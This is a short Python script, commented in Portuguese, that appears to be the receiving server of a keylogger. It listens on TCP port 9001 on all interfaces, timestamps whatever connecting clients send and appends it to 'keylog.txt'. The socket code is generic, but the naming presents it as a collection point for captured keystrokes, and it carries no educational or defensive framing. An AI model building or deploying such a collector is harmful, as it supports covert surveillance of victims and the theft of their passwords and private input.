import socket
from datetime import datetime

# Configurações do servidor
HOST = '0.0.0.0'  # Escuta em todas as interfaces de rede
PORT = 9001
LOG_FILE = 'keylog.txt' # Nome do arquivo onde os dados serão salvos

def main():
    print(f"[*] Servidor de log iniciado. Escutando em {HOST}:{PORT}")
    print(f"[*] Pressione CTRL+C para parar.")
    print("-" * 30)

    # Cria um socket TCP/IP
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        # Este bloco está no nível 2 de indentação
        s.bind((HOST, PORT))
        s.listen()

        while True:
            try:
                # Espera por uma conexão
                conn, addr = s.accept()
                with conn:
                    print(f"[*] Conexão recebida de {addr[0]}:{addr[1]}")

                    # Recebe os dados
                    data = conn.recv(1024)
                    if not data:
                        continue

                    # Decodifica os dados e remove espaços em branco extras
                    log_entry = data.decode('utf-8').strip()

                    # Pega a data e hora atual
                    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')

                    # Formata a linha de log
                    formatted_log = f"[{timestamp}] {log_entry}"

                    # Imprime no terminal
                    print(formatted_log)

                    # Salva no arquivo de log
                    with open(LOG_FILE, 'a') as f:
                        # Este bloco está no nível 5 de indentação
                        f.write(formatted_log + '\n')

            except KeyboardInterrupt:
                print("\n[*] Servidor interrompido pelo usuário. Fechando.")
                break
            except Exception as e:
                print(f"[ERRO] Ocorreu um erro: {e}")

if __name__ == '__main__':
    main()
